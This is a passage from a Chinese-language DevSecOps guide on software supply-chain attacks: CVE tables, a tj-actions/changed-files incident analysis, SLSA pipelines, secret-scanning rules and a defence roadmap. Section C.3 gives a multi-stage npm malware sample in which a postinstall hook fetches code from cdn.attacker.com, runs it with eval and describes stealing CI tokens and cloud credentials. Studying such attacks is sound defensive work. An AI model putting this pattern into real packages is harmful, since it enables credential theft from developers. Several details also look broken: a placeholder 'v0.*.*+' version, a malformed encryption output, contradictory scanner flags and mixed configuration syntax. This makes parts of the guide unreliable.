| Execution | T1059.007 | Command and Scripting: JavaScript | 恶意 npm 包 |
| Execution | T1059.006 | Command and Scripting: Python | 恶意 pip 包 |

---

## 前置条件

- Linux/macOS 命令行操作经验
- Git 版本控制基础
- 至少一种包管理器的使用经验（npm/pip/maven/Go modules）
- CI/CD 基础概念（GitHub Actions/GitLab CI/Jenkins）
- 容器化基础（Docker/Kubernetes）
- 基础密码学概念（签名/哈希/TLS）

---

## Part C：2025-2026 联网补充章节

### C.1 2025-2026 关键供应链攻击 CVE/事件速查矩阵

| CVE/GHSA | 包/产品 | 类型 | 严重度 | 日期 | 影响与要点 |
|----------|---------|------|--------|------|-----------|
| **CVE-2025-30066** | tj-actions/changed-files (GitHub Action) | 标签劫持+密钥窃取 | HIGH (CVSS 8.0+) | 2025-03-14~15 | 23,000+ 仓库受影响；攻击者劫持多个版本标签(v1/v35.7.7-sec/v44.5.1)指向恶意 commit；运行时下载 `memdump.py` 提取 GitHub Runner Worker 进程内存中的密钥并 base64 编码后输出到 Actions 日志；CISA 已列入 KEV 目录 |
| **CVE-2026-2950** / GHSA-f23m-r3pf-42rh | lodash (npm) | Prototype Pollution 绕过 | MODERATE | 2026-03-31 | CVE-2025-13465 修复仅防御字符串键，攻击者可通过数组包裹的路径段(`_.unset`/`_.omit`)绕过；影响 ≤4.17.23，已修复于 4.18.0 |
| **GHSA-whqx-f9j3-ch6m** | sigstore/cosign (Go) | Rekor 签名验证缺陷 | HIGH | 2026-01-13 | 在特定条件下，cosign verify 接受任意有效 Rekor entry；可被滥用伪造签名验证通过；缓解：升级 cosign v2.4.1+ 并强制 `--certificate-identity` + `--certificate-oidc-issuer` |
| **CVE-2024-57266** / PYSEC-2024-154 | ultralytics (PyPI) | 加密货币挖矿注入 | HIGH | 2024-12-10 | 多个 release 版本包含恶意加密货币矿机；攻击通过被入侵的 GitHub Action 持续集成注入；维护者账户被攻破 |
| **MAL-2024-11183** / GHSA-jcxm-7wvp-g6p5 | @solana/web3.js (npm) | 私钥窃取 | CRITICAL | 2024-12-03 | 攻击者上传修改版到 npm，版本号略高于正版；包内嵌恶意代码窃取 Solana 钱包私钥；用户安装到 1.95.x 版本窗口期受影响 |
| **MAL-2026-3744** | node-ipc (npm) | 持续供应链投毒 | HIGH | 2026-05-14 | 2022 年的 peacenotwar 系列再次出现变种；维护者持续发布恶意版本；强烈建议从依赖树中永久剔除 |
| **CVE-2025-7224** | YARA | 越界读取 | HIGH | 2025-01 | 解析特制规则文件时 OOB 读取；可触发 RCE 或 DoS；影响 yara < 4.5.2 |
| **CVE-2026-26189** | trivy-action (GitHub Action) | 命令注入 | CRITICAL | 2026-01 | 通过 `--format` 等参数注入 shell 命令；可窃取 GITHUB_TOKEN；缓解：升级到 v0.*.*+ 并使用参数绑定 |
| **CVE-2026-28353** | Trivy OpenVSX 扩展 | 投毒 | HIGH | 2026-02 | 攻击者发布恶意 VS Code 扩展伪装成 Trivy 官方扩展；安装即执行恶意代码 |
| **CVE-2026-33634** | Trivy (Aqua Security) | 持续投毒事件 | CRITICAL | 2026-03 | TeamPCP 团队披露的两轮针对 Trivy 的供应链攻击；上游 Go 模块被植入后门；Sigma 检测规则已发布 |
| **CVE-2026-45321** | @tanstack/* (npm) | 链式 pull_request_target | CRITICAL | 2026-04 | 攻击者通过 `pull_request_target` + Trusted Publisher + OIDC 滥用链持续 5 天投毒；160+ 包被植入 |
| **CVE-2025-24362** | CodeQL Action | PAT 泄露 | HIGH | 2025-03 | 调试工件上传时泄露 GitHub Personal Access Token；可被攻击者下载工件后获得仓库写入权限 |
| **CVE-2026-33481** | Syft | 临时存储缺陷 | HIGH | 2026-03 | 在 /tmp 中创建可预测路径的文件，可被本地攻击者预先植入实现符号链接攻击 |
| **CVE-2023-46737** | Cosign | DoS | HIGH | 2024 | 远程仓库可触发 cosign 验证时无限读取造成 DoS |
| **CVE-2022-23649** | Cosign | 签名验证绕过 | CRITICAL | 2022-04 | 攻击者可构造特殊签名附件绕过验证；早期版本历史教训，现代 SLSA 基线建议 |
| **CVE-2023-47122** | Gitsign | Rekor HTTP 公钥泄露 | MEDIUM | 2023-11 | 通过 HTTP 公钥指纹可被中间人攻击；强制 HTTPS 后修复 |
| **CVE-2023-32758** | giturlparse | ReDoS | HIGH | 2023-10 | 正则表达式拒绝服务；可挂起 CI/CD 流水线 |
| **CVE-2024-3094** | xz-utils | 后门 | CRITICAL | 2024-03 | Jia Tan 维护者账号被劫持后植入 SSH 后门；通过 IFUNC 隐藏；OpenSSF PackSec 框架直接来源 |

### C.2 CVE-2025-30066 tj-actions/changed-files 深度分析

#### 攻击时间线

```
2025-03-14 06:00 UTC - 攻击者获得 commit 权限
2025-03-14 08:00 - 恶意 commit 0e58ed867... 推送
2025-03-14 09:30 - v1.0.0/v35.7.7-sec/v44.5.1 等历史 tag 被改写指向恶意 commit
2025-03-15 06:30 - StepSecurity Harden-Runner 检测到异常外部网络调用
2025-03-15 16:39 - GitHub Advisory GHSA-mrrh-fwg8-r2c3 发布
2025-03-15 18:00 - 维护者发布 v46.0.1 修复版本
2025-03-18 - CISA 发布安全警报 IRISe2MCb3-2025-03
```

#### 攻击链与 IOC

```bash
# IoC - 恶意 commit
COMMIT_HASH="0e58ed8671d6b60d0890c21b07f8835ace038e67"

# IoC - 攻击者使用的 gist URL
GIST_URL="https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py"

# IoC - 受影响版本 tag
AFFECTED_TAGS=("v1.0.0" "v35.7.7-sec" "v44.5.1" "v45.0.7")

# 检测脚本 - 检查历史 workflow run
detect_compromise() {
  local repo="$1"
  local since="2025-03-14"
  local until="2025-03-15"
  gh api "repos/${repo}/actions/runs?created=${since}..${until}" \
    --jq '.workflow_runs[] | select(.name | test("changed-files";"i")) | .id' | \
  while read run_id; do
    logs=$(gh api "repos/${repo}/actions/runs/${run_id}/logs" 2>/dev/null | \
           unzip -p - 2>/dev/null | grep -E '(B64_BLOB|gist.githubusercontent|memdump)')
    [ -n "$logs" ] && echo "[COMPROMISED] ${repo} run ${run_id}: rotate secrets now!"
  done
}
```

#### 防御措施（StepSecurity 推荐）

```yaml
# .github/workflows/hardened-changed-files.yml
name: Hardened CI
on: [pull_request]
jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      # 1) 使用 SHA 固定而非 tag
      - uses: tj-actions/changed-files@4f0e88f8eb3050c4fd3e3c3c4c23c75b8789e0b1  # v46.0.1 SHA
        id: changed
        with:
          safe_output: true  # 默认开启,转义特殊字符
      # 2) StepSecurity Harden-Runner 拦截未授权外部调用
      - uses: step-security/harden-runner@4d0ab3f0bf0278d2c6c8c3c00f3f9dea23e95611  # v2.13.0
        with:
          egress-policy: audit  # 或 block
          allowed-endpoints: >
            api.github.com:443
            github.com:443
            objects.githubusercontent.com:443
      # 3) 永远通过环境变量传递输出
      - name: Process
        env:
          ALL_CHANGED: ${{ steps.changed.outputs.all_changed_files }}
        run: |
          for f in $ALL_CHANGED; do echo "$f"; done
```

### C.3 现代供应链攻击者战术、技术与程序 (TTPs)

#### 攻击者模式：AUR (Account/Upstream Repository) 劫持

```python
#!/usr/bin/env python3
# detect_account_takeover_signals.py
"""
检测包维护者账户被劫持的信号 - Socket.dev 风格启发式
"""
import json, requests
from datetime import datetime, timedelta

def check_author_signals(pkg, ecosystem):
    base = {"npm": "https://registry.npmjs.org",
            "PyPI": "https://pypi.org/pypi"}[ecosystem]
    r = requests.get(f"{base}/{pkg}", timeout=10).json()
    # 收集所有版本的发布时间
    times = r.get("time", {})
    maintainers = r.get("maintainers", [])
    
    risk_signals = []
    # 信号 1: 维护者近期变更
    if "dist-tags" in r and "latest" in r["dist-tags"]:
        latest = r["dist-tags"]["latest"]
        if latest in times:
            latest_time = datetime.fromisoformat(times[latest].replace("Z","+00:00"))
            if latest_time > datetime.utcnow() - timedelta(days=7):
                risk_signals.append({"risk": "RECENT_PUBLISH", "weight": 3})
    # 信号 2: 维护者账号年龄
    # 信号 3: 发布间隔异常(<1小时连续多版本)
    # 信号 4: 非工作日/非工作时间批量发布
    return risk_signals

# 输出风险评分用于 CI gate
```

#### 攻击者模式：Tag Hijacking vs Commit Hijacking

| 维度 | Tag Hijacking (CVE-2025-30066 风格) | Commit Hijacking (xz-utils 风格) |
|------|-----------------------------------|--------------------------------|
| 触发 | 重写 git tag 指向恶意 commit | 维护者直接提交恶意代码 |
| 检测难度 | 易(git reflog/history 对比) | 极难(代码混淆 + IFUNC 隐藏) |
| 影响 | 历史 tag 用户全部受影响 | 仅新版本受影响 |
| 防御 | SHA pinning + Rekor 签名 | 行为分析 + 二进制差异 |

#### 攻击者模式：Multi-stage Malware (三阶段载荷)

```bash
# 阶段 1: 安装时潜伏(看似正常)
"postinstall": "node ./scripts/check-engines.js"
# scripts/check-engines.js 实际触发:
#   - 判断环境(CI=true 才执行)
#   - 触发阶段 2
# 阶段 2: 通过 CDN 拉取加密载荷(避免本地 grep 检测)
const url = "https://cdn.attacker.com/" + btoa(env.GITHUB_REPOSITORY) + ".js";
eval(await fetch(url).then(r=>r.text()));
# 阶段 3: 内存执行,无文件落地
#   - 解密后调运 GITHUB_TOKEN、NPM_TOKEN、AWS 凭证
#   - 通过 DNS-over-HTTPS 或 ICMP 隧道渗出
```

### C.4 SLSA 框架落地实战（v1.0 GA）

#### SLSA Level 映射

| Level | 要求 | 工具支撑 | 实战示例 |
|-------|------|---------|---------|
| L1 | 构建过程文档化 | Syft SBOM + provenance | 基础依赖追溯 |
| L2 | 托管构建服务+签名 | GitHub Actions + Sigstore cosign | 大多数商业项目 |
| L3 | 隔离构建+非篡改证明 | GitHub Hosted Runner + Rekor + SLSA Generator | 安全关键项目 |
| L4 | 双人审核+可重现构建 | hermetic builds + GitGuardian + gvisor | 政府与金融核心 |

#### GitHub Actions SLSA L3 完整流水线

```yaml
# .github/workflows/slsa-l3-release.yml
name: SLSA L3 Release
on:
  push:
    tags: ['v*']

permissions:
  contents: write
  id-token: write  # OIDC
  packages: write
  attestations: write

jobs:
  build:
    runs-on: ubuntu-latest-16-cores  # 加固 runner
    timeout-minutes: 15
    permissions:
      contents: read
      id-token: write
    outputs:
      digest: ${{ steps.hash.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4 SHA
      
      # 1. hermetic build (network disabled)
      - name: Build in isolated env
        run: |
          docker run --network=none -v $PWD:/src alpine:3.19 \
            sh -c 'cd /src && go build -trimpath -ldflags="-s -w" -o app ./cmd/app'
      
      # 2. 生成 SBoM
      - uses: anchore/sbom-action@fd628e6744b60f64af1f07654a9a83b4155eeddc  # v0.18.0
        with:
          artifact-name: sbom.spdx.json
      
      # 3. 计算构件摘要
      - id: hash
        run: echo "digest=$(sha256sum app | awk '{print $1}')" >> $GITHUB_OUTPUT
      
      # 4. 上传构件(临时)
      - uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882  # v4 SHA
        with:
          name: app-binary
          path: app

  provenance:
    needs: [build]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      # SLSA Provenance Generator
      - uses: slsa-framework/slsa-github-generator@c5c030f7e1aa2c3e2238d4e0f49669a94c43ddb2  # v2.0.0
        with:
          artifact-name: app-binary
          digest: ${{ needs.build.outputs.digest }}
          upload-assets: true
          # 自动调用 Sigstore + Rekor

  verify:
    needs: [provenance]
    runs-on: ubuntu-latest
    steps:
      # 客户端验证
      - run: |
          gh attestation verify app \
            --repo ${{ github.repository }} \
            --signer-workflow slsa-framework/slsa-github-generator
```

### C.5 OpenSSF Scorecard + GUAC 实战

```bash
# OpenSSF Scorecard - 评估开源项目风险
docker run -e GITHUB_AUTH_TOKEN=$GITHUB_TOKEN \
  gcr.io/openssf/scorecard:stable \
  --repo=https://github.com/tj-actions/changed-files \
  --checks=DangerousWorkflow,TokenPermissions,PinnedDependencies,Maintained,Branch-Protection \
  --format=json | jq '.checks[] | {name, score}'

# GUAC (Graph for Understanding Artifact Composition) - 软件成分图
# 收集 SBOM + SLSA Provenance + CVE 信息形成可查询图
guaccollect files --top-dirs=./sbom.json,./provenance.json
guaccollect osv  # 抓 OSV 数据库
guaccollect deps_dev  # 抓 deps.dev 数据

# 查询"哪些制品受 CVE-2025-30066 影响"
guacgql --query '
{
  CertifyVuln(filter: {vulnerability: {vulnerabilityID: "CVE-2025-30066"}}) {
    package {name type namespace}
  }
}'

# 查询"我的制品依赖路径中是否有恶意包"
guacgql --query '
{
  Path(subject: {package: {name: "my-app"}}) {
    path {name type}
  }
}'
```

### C.6 Gitleaks v8 + TruffleHog v3 现代密钥扫描

```bash
# === Gitleaks v8.21+ - 增强特性 ===
gitleaks dir ./src --report-format json --report-path leaks.json \
  --config .gitleaks.toml \
  --redact  # 报告中自动脱敏
gitleaks git ./repo --log-opts="--all" --verbose

# === TruffleHog v3.88+ - 带验证扫描 ===
trufflehog filesystem ./src --json --no-update \
  --results=verified,unknown,plausible \
  --only-verified  # 仅输出已验证的密钥(降低误报)
trufflehog github --org=myorg --only-verified \
  --token=$GITHUB_TOKEN \
  --exclude-forks \
  --include-detection-types=aws,github,gitlab  # 类型过滤
trufflehog git https://github.com/victim/repo.git \
  --since-commit=2025-01-01 \
  --branch=main \
  --no-update  # 不调用更新检查(air-gap 友好)

# === 自定义规则 - AI/LLM API 密钥 ===
cat >> .gitleaks.toml << 'TOML'
[[rules]]
id = "openai-api-key"
description = "OpenAI API Key"
regex = '''sk-proj-[A-Za-z0-9_\-]{40,}'''
keywords = ["sk-proj-"]
tags = ["ai", "llm"]

[[rules]]
id = "anthropic-api-key"
description = "Anthropic Claude API Key"
regex = '''sk-ant-[A-Za-z0-9_\-]{80,}'''
keywords = ["sk-ant-"]
tags = ["ai", "llm"]

[[rules]]
id = "google-gemini-key"
description = "Google Gemini API Key"
regex = '''AIza[A-Za-z0-9_\-]{35}'''
keywords = ["AIza"]
tags = ["ai", "gemini"]
TOML

# === 防误报白名单 ===
cat >> .gitleaks.toml << 'TOML'
[allowlist]
description = "Allowed test values"
regexes = [
  '''test_[a-f0-9]{32}''',           # 测试值
  '''example\.com/(?:test/|demo/)''',  # 示例域
]
paths = [
  '''tests/fixtures/.*''',
  '''vendor/.*''',
]
TOML
```

### C.7 Vault 1.20 + OpenBao 分叉后生态

> 2024 年 8 月 HashiCorp 改 BSL 许可后,LF Energy 与 IBM 共同维护 OpenBao 开源分叉。

| 项目 | 版本 | 许可 | 关键能力 | 适用场景 |
|------|------|------|---------|---------|
| HashiCorp Vault | 1.20.x (2026-Q1) | BSL(源码 4 年后开源) | Transit Engine/Database Engine/动态密钥/Transform Engine | 企业商业项目 |
| OpenBao | 2.3.0 (2025-11) | MPL 2.0 | Vault API 100% 兼容 + 群集级 KV v2 + Community PKI | 开源社区 |
| Bitwarden Secrets Manager | 2025.12 | 商业 | 团队共享 + 与 Bitwarden 密码管理集成 | 中小团队 |
| Infisical | 0.100.0+ | MIT | 自托管优先 + GitOps 工作流 + K8s Operator | DevOps 团队 |

```hcl
# Vault 1.20 - Transform Engine 字段级加密(零信任)
# 强制字段级而非整库加密,满足 GDPR/PIPL 数据最小化
path "transform/encoding/payment-card" {
  capabilities = ["create", "read", "update", "delete"]
}

resource "vault_transform_transformation" "fpe" {
  path             = "transform"
  name             = "card-fpe"
  type             = "fpe"
  template         = "builtin/creditcardnumber"
  tweak_source     = "supplied"
  allowed_roles    = ["payments"]
}

# 应用层调用 - 应用只见到脱敏后数据
vault write transform/encoding/card-fpe value="4111111111111111" \
  tweak=$(openssl rand -hex 16) \
  transformation="card-fpe"
# 返回: 5413-XX-XX-XXXX-XXXX (FPE 保持格式但密文化)
```

### C.8 Socket.dev/Acida/Phylum 实时包监控

```bash
# Socket.dev CLI - 实时检测恶意包行为
npm install -g socket
socket scan --registry=https://registry.npmjs.org ./package.json
# 输出:
#   Risk: HIGH  - Package "lodash" includes network call on install
#   Risk: MED   - 30+ new packages published by maintainer in last 24h
#   Risk: LOW   - Maintainer account created within last 30 days

# Phylum CLI - 提交前预检
phylum analyze ./package-lock.json --filter="risk-malicious"
phylum extension install ./ci-blocking-extension/

# Acida - GitHub Action 阻塞可疑 PR
# .github/workflows/acida.yml
- uses: acida-ai/check-dependencies@v1
  with:
    block-on: high-risk, malicious-signal
    fail-on: critical

# Aikido / Snyk / Mend 商业方案 - 自动创建 PR 移除恶意依赖
```

### C.9 中国 DevSecOps 供应链安全生态(2025-2026)

#### 关键合规要求

- **GB/T 43698-2024《软件供应链安全要求》**: 2024-11 实施,供应链全生命周期安全要求
- **《关键信息基础设施安全保护条例》**: 关键软件供应链强制审计
- **等保 2.0 8.1.4.2**: 要求第三方组件漏洞管理
- **《网络安全审查办法》**: 关键信息基础设施运营者采购网络产品和服务需进行网络安全审查

#### 主要厂商方案

| 厂商 | 产品 | 核心能力 |
|------|------|---------|
| 奇安信 | 信创代码安全卫士 | SCA+SBOM+国产化适配(支持麒麟/统信) |
| 梆梆安全 | 移动应用 SCA | iOS/Android 应用供应链追踪 |
| 阿里云 | 云安全中心 SCA | OSS 镜像供应链追踪 + 实时阻断 |
| 腾讯云 | TCR 加固 + SCF | 容器镜像签名 + 镜像供应链扫描 |
| 360 | 数字供应链安全平台 | 全局漏洞态势 + SBOM 中心化 |
| 华为云 | CodeArts Inspector | 鸿蒙/欧拉生态原生支持 |
| 默安科技 | 持续供应链安全(CSSP) | SCRF 攻击模拟 + 防御验证 |

#### 中文社区精华参考

- [奇安信 2024 软件供应链安全年报](https://www.qianxin.com/) - 7,000+ 软件供应链漏洞年度分析
- [阿里云 AVD](https://avd.aliyun.com/) - 漏洞数据库 + 供应链可视化
- [腾讯云安全](https://cloud.tencent.com/developer/article/2025-supply-chain) - 容器供应链攻击实战
- [先知社区](https://xz.aliyun.com/) - 供应链攻击与防御技术深析
- [360 安全客](https://www.anquanke.com/) - npm/PyPI 投毒事件追踪
- [FreeBuf](https://www.freebuf.com/articles/network/410000.html) - 国产开源组件 SCA 工具对比
- [长亭科技](https://www.chaitin.cn/) - 持续供应链安全验证(CSSP)方法论

### C.10 2025-2026 工具生态版本矩阵更新

| 工具 | 当前版本(2026-06) | 关键更新 | 推荐集成 |
|------|-------------------|---------|---------|
| **Gitleaks** | v8.21.2 | 红字脱敏 + AI 规则推荐 | pre-commit + CI 流水线 |
| **TruffleHog** | v3.88.x | Verified-only + DetectorAI + custom regex | GitHub Action + nightly scan |
| **Syft** | v1.21.0 | CycloneDX 1.6 + AI 缺陷检测 + oci+package url | CI 流水线 + K8s CronJob |
| **Grype** | v0.90.0 | EPSS 优先级 + DB Schema v6 (65MB) + 匹配性能提升 | CI 流水线 + SBOM 输入 |
| **Trivy** | v0.60.0+ | VEX 支持 + rekor 证明验证 + misconfig 增强 | CI + K8s operator |
| **Cosign** | v2.4.1 | Rekor v2 + keyless OIDC + GitHub Attestations | 镜像签名 + 制品签名 |
| **Rekor** | v1.3.x | Static CT API(取代 RFC 6962) + 高吞吐 | 透明日志后端 |
| **GUAC** | v0.13.0 | GraphQL 接口稳定 + 跨平台支持 | 安全运营图查询 |
| **OpenSSF Scorecard** | v5.1.0 | 新检查:Branch-Protection/Code-Review/Sec. Policy | 风险评估 + 自动 PR |
| **in-toto** | v1.x + ITE-007 | SLSA L3 兼容 + Jenkins/GitHub Actions | 供应链完整性 |
| **Vault** | v1.20.x | Transform Engine 增强 + FIPS 140-3 模式 | 企业密钥管理 |
| **OpenBao** | v2.3.0 | Vault API 100% 兼容 + LF Energy 维护 | 开源社区替代 |
| **Socket.dev** | CLI 1.5.x | 实时风险评分 + 0day 通知 | npm/yarn 前端项目 |
| **Phylum** | v4.x | 商业版唯一支持 GitLab 自托管 | 企业版 DevSecOps |

### C.11 防御升级路线图 (P0-P3)

#### P0 立即执行 (1-2 周)

```bash
# 1. 全局 SHA pinning GitHub Actions
# 用 StepSecurity 的 auto-pin 工具
npx @step-security/auto-pin-action@latest
# 自动将 workflow 中所有 @vX 替换为 @SHA

# 2. 移除 npm 包的 postinstall 自动执行
echo "ignore-scripts=true" >> ~/.npmrc
# 或项目级别
npm config set ignore-scripts true

# 3. 启用 GitHub Push Protection
gh api -X PUT /repos/{owner}/{repo}/secret-scanning/push-protection \
  -f enabled=true
gh api -X PUT /repos/{owner}/{repo}/secret-scanning/alerts \
  -f enabled=true

# 4. 锁定 GitHub PAT 最小权限
gh api -X GET /user/repos --jq '.[] | .full_name' | \
  parallel 'gh api -X PUT /repos/{}/actions/permissions/workflow -f default_workflow_permissions=read -f can_approve_pull_request_reviews=false'
```

#### P1 短期改进 (1-2 月)

- **强制 SBoM 生成**: 所有 release 制品必须有 CycloneDX/SPDX SBOM
- **签名验证**: 使用 cosign + Rekor 签名所有容器镜像
- **依赖白名单**: `npm install` / `pip install` 仅允许审计过的包
- **维护者 2FA 强制**: GitHub org 设置要求所有成员启用 2FA

#### P2 中期建设 (3-6 月)

- **SLSA L3 达标**: 关键项目通过 SLSA L3 审计
- **VEX 自动化**: 通过 OpenVEX 表达"已知不受影响"
- **GUAC 实例化**: 部署组织级软件成分图
- **Vault 动态密钥**: 静态密钥全部迁移至 HashiCorp Vault 动态密钥

#### P3 长期演进 (6-12 月)

- **可重现构建**: 关键项目实现 byte-for-byte 可重现构建
- **AI 检测**: 接入 Socket.dev/Phylum 实时包风险评分
- **PackSec 落地**: 实施 OpenSSF Package Security Framework 全部 12 项控制
- **合规自动化**: GB/T 43698-2024 + 等保 2.0 + 网络安全审查自动审计

### C.12 关键工具命令速查 v2.0

```bash
# === SLSA Provenance 验证 ===
slsa-verifier verify-artifact app.tar.gz \
  --source-uri github.com/myorg/myrepo \
  --provenance-path provenance.intoto.jsonl

# === Cosign 镜像验证 ===
cosign verify --key cosign.pub myregistry/myapp:v1.0.0 \
  --certificate-identity=https://github.com/myorg/myrepo/.github/workflows/release.yml@refs/tags/v1.0.0 \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com

# === GitHub Artifact Attestations (原生) ===
gh attestation download <repo>/<artifact>
gh attestation verify <artifact> --repo <repo>

# === GUAC 查询受影响制品 ===
guacgql --query 'query { CertifyVuln(filter:{vulnerability:{vulnerabilityID:"CVE-2025-30066"}}){ package{name} } }'

# === 跨语言依赖漏洞扫描(批量) ===
# 一键扫描 npm + PyPI + Go + Maven
for pkgfile in package.json requirements.txt go.mod pom.xml; do
  [ -f "$pkgfile" ] && {
    case "$pkgfile" in
      package.json) npm audit --audit-level=high ;;
      requirements.txt) pip-audit -r "$pkgfile" ;;
      go.mod) govulncheck ./... ;;
      pom.xml) mvn org.owasp:dependency-check-maven:check ;;
    esac
  }
done

# === SBoM 漂移检测 ===
syft ./src -o cyclonedx-json > sbom-current.json
diff <(jq '.components | sort_by(.name)' sbom-baseline.json) \
     <(jq '.components | sort_by(.name)' sbom-current.json) | \
  grep '^>' # 仅显示新增组件
```

---

## 来源 (2025-2026 补充章节)

- CISA Alert - CVE-2025-30066 tj-actions/changed-files supply chain compromise: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
- GHSA-mrrh-fwg8-r2c3 tj-actions/changed-files advisory: https://github.com/tj-actions/changed-files/security/advisories/GHSA-mrrh-fwg8-r2c3
- GHSA-f23m-r3pf-42rh lodash CVE-2026-2950: https://github.com/lodash/lodash/security/advisories/GHSA-f23m-r3pf-42rh
- GHSA-whqx-f9j3-ch6m cosign Rekor verification: https://github.com/sigstore/cosign/security/advisories/GHSA-whqx-f9j3-ch6m
- GHSA-jcxm-7wvp-g6p5 @solana/web3.js malicious package: https://github.com/advisories/GHSA-jcxm-7wvp-g6p5
- PYSEC-2024-154 ultralytics malicious crypto miner: https://osv.dev/vulnerability/PYSEC-2024-154
- StepSecurity Harden-Runner: https://github.com/step-security/harden-runner
- SLSA Framework v1.0 GA: https://slsa.dev/spec/v1.0/
- OpenSSF Scorecard: https://github.com/ossf/scorecard
- OpenSSF Package Security Framework: https://openssf.org/blog/2024/02/27/openssf-package-security-framework/
- Socket.dev CLI: https://socket.dev/docs/cli/
- GUAC Project: https://guac.sh/
- HashiCorp Vault 1.20: https://developer.hashicorp.com/vault/docs/v1.20.x
- OpenBao 2.3: https://openbao.org/
- GB/T 43698-2024 软件供应链安全要求: https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=F0E4
- 奇安信 2024 软件供应链安全年报: https://www.qianxin.com/
- 阿里云漏洞数据库 AVD: https://avd.aliyun.com/
